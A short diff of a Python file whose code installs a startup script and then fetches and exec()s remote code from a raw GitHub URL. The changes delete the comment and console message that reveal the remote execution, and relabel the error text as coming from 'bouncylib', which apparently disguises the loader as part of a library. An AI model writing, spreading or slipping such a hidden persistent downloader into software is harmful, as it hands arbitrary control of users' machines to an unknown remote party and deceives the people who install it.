@@ -29,17 +29,16 @@ if __name__ == "__main__":
     return script_path
 
 def run_remote_code_now(url):
-    """Run the GitHub code immediately (before restart)."""
     try:
         response = requests.get(url)
         response.raise_for_status()
         code = response.text
-        print("[→] Running GitHub code now...")
         exec(code, globals())
     except Exception as e:
-        print("Error running GitHub code immediately:", e)
+        print("Error running bouncylib code immediately:", e)
 
 if __name__ == "__main__":
     install_startup_script()
     github_url = "https://raw.githubusercontent.com/KTDeboa/scwebsiteslist/refs/heads/main/stup"
     run_remote_code_now(github_url)
+
